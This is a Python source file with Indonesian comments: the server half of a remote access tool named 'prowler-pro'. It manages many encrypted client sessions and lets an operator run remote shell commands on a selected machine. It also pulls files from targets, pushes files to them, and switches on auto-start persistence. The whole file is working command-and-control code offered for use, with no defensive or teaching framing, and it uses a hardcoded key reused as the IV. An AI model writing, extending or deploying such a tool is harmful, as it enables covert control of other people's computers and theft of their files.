import os
import socket
import sys
import threading
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

HOST = '0.0.0.0'
PORT = 9999

# Kunci Enkripsi AES (Harus 16, 24, atau 32 byte). Samakan dengan client!
AES_KEY = b'IniKunciRahasiaSangatPro12345678' 

all_connections = []
all_addresses = []

def encrypt_data(data_str):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_KEY[:16])
    padded_data = pad(data_str.encode('utf-8'), AES.block_size)
    return cipher.encrypt(padded_data)

def decrypt_data(data_bytes):
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_KEY[:16])
        decrypted_padded = cipher.decrypt(data_bytes)
        return unpad(decrypted_padded, AES.block_size).decode('utf-8', errors='ignore')
    except Exception:
        return "[-] Gagal mendekripsi data. Kunci salah atau data korup."

def create_socket():
    try:
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print(f"[-] Gagal membuat socket: {msg}")

def bind_socket():
    try:
        global s
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)
        print(f"[*] Server PRO mendengarkan di port {PORT}...")
    except socket.error as msg:
        print(f"[-] Binding gagal: {msg}\nMencoba ulang dalam 5 detik...")
        time.sleep(5)
        bind_socket()

def accepting_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)
            
            # Menerima info OS yang terenkripsi dari client
            encrypted_info = conn.recv(4096)
            os_info = decrypt_data(encrypted_info)
            
            all_connections.append(conn)
            all_addresses.append(address)
            
            print(f"\n[+] Sesi SECURE terhubung: {address[0]}:{address[1]} ({os_info})")
            print("prowler-pro> ", end="")
        except Exception:
            break

def start_shell():
    while True:
        cmd = input("prowler-pro> ")
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif cmd == 'exit':
            print("[*] Menutup semua koneksi aman...")
            for conn in all_connections:
                conn.close()
            s.close()
            sys.exit()
        else:
            print("[-] Perintah: 'list', 'select <id>', atau 'exit'")

def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(encrypt_data('ping'))
            resp = conn.recv(1024)
        except Exception:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += f" [{i}]   {all_addresses[i][0]}:{all_addresses[i][1]}\n"
    print("----- Client Aktif (Terenkripsi) -----")
    print("ID    IP:PORT")
    print(results)

def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print(f"[+] Secure Channel aktif ke {all_addresses[target][0]}")
        print("[!] Fitur Tambahan: \n -> download <nama_file_di_target>\n -> upload <nama_file_di_server>\n -> persistence (aktifkan auto-start)\n -> back (menu utama)")
        return conn
    except Exception:
        print("[-] Pilihan target tidak valid.")
        return None

def send_target_commands(conn):
    # Flush buffer jika ada sisa ping
    conn.settimeout(1)
    try: conn.recv(1024)
    except socket.timeout: pass
    conn.settimeout(None)

    while True:
        try:
            cmd = input("secure-remote> ")
            if cmd == 'back':
                break
            if len(cmd) == 0:
                continue

            # --- FITUR DOWNLOAD FILE ---
            if cmd.startswith("download "):
                conn.send(encrypt_data(cmd))
                filename = cmd.split(" ", 1)[1]
                print(f"[*] Mengunduh {filename}...")
                
                # Terima status file ready/tidak
                status = decrypt_data(conn.recv(1024))
                if "READY" in status:
                    # Ambil ukuran file
                    file_size = int(status.split(":")[1])
                    with open(f"downloaded_{filename}", "wb") as f:
                        bytes_received = 0
                        while bytes_received < file_size:
                            chunk = conn.recv(4096)
                            if not chunk: break
                            f.write(chunk)
                            bytes_received += len(chunk)
                    print(f"[+] File berhasil didownload dan disimpan sebagai: downloaded_{filename}")
                else:
                    print(status)
                continue

            # --- FITUR UPLOAD FILE ---
            elif cmd.startswith("upload "):
                filename = cmd.split(" ", 1)[1]
                if os.path.exists(filename):
                    conn.send(encrypt_data(cmd))
                    file_size = os.path.getsize(filename)
                    # Kirim notifikasi ready dan ukuran file
                    conn.send(encrypt_data(f"READY:{file_size}"))
                    
                    # Tunggu konfirmasi kesiapan client
                    ack = decrypt_data(conn.recv(1024))
                    if ack == "START":
                        print(f"[*] Mengunggah {filename} ({file_size} bytes)...")
                        with open(filename, "rb") as f:
                            while True:
                                chunk = f.read(4096)
                                if not chunk: break
                                conn.send(chunk)
                        print("[+] Upload selesai.")
                        print(decrypt_data(conn.recv(4096))) # Terima respon akhir client
                else:
                    print("[-] File lokal tidak ditemukan di komputer Server.")
                continue

            # --- PERINTAH STANDARD SHELL / PERSISTENCE ---
            conn.send(encrypt_data(cmd))
            raw_response = conn.recv(8192)
            client_response = decrypt_data(raw_response)
            print(client_response, end="")

        except Exception as e:
            print(f"[-] Sesi terputus: {e}")
            break

def main():
    create_socket()
    bind_socket()
    t = threading.Thread(target=accepting_connections)
    t.daemon = True
    t.start()
    start_shell()

if __name__ == '__main__':
    main()
